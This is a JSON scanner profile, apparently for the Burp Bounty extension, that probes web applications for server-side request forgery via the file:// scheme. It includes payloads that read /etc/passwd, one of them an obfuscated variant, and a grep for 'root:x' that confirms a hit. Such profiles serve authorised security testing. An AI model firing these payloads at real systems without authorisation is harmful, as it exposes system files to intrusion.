[
  {
    "ProfileName": "SSRF-URLScheme",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@egarme",
    "Payloads": [
      "true,file:///etc/passwd",
      "true,file://\\/\\/etc/passwd"
    ],
    "Encoder": [
      " "
    ],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,,root:x"
    ],
    "Tags": [
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 9,
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "SSRF-URLScheme",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "SSRF-URLScheme with payload: \u003cbr\u003e\u003cpayload\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]